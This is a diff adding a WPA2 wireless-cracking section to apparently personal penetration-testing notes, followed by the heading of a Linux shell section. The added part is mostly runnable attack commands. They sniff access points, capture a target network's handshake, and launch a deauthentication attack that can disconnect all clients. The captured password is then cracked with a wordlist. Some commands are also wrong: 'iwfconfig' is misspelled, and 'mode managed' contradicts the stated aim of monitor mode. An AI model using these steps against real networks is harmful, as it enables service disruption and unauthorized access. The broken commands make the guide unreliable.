@@ -1,3 +1,37 @@
+# Wireless
+
+To start with WPA2 Cracking make sure that your network interface is in monitor <br/>
+
+````
+ifconfig wlan0 down
+iwfconfig wlan0 mode managed
+ifconfig wlan0 up
+````
+Then run airmon-ng <br/>
+```
+airmon-ng check kill
+airmon-ng start wlan0
+```
+To sniff different AP (Access Points)<br/>
+
+`airodump-ng wlan0`
+
+To start capturing traffic for a specific AP we use channel number `-c` and MAC address `--bssid` <br/>
+
+`airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS wlan0 `<br/>
+
+Now in order to capture the 4-way handshake we need to start the above command with a parameter `-w` so that the caputre file can be saved<br/>
+
+ `airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS -w FILENAME wlan0`<br/>
+
+Keep this running and launch the deauthentication attack on the AP with a specific host , you can do this to death all clients/host on the AP <br/>
+
+`aireplay-ng -0 0 -a MAC_ADDRESS -c HOST_NAME wlan0`<br/>
+
+When a client connects back to the host this will capture the handshake.To crack the password we need to use aircrack-ng <br/>
+
+`aircrack-ng FILENAME.cap -w path/towordlist/`
+
 # Linux
 
 ### Stablilize Shell
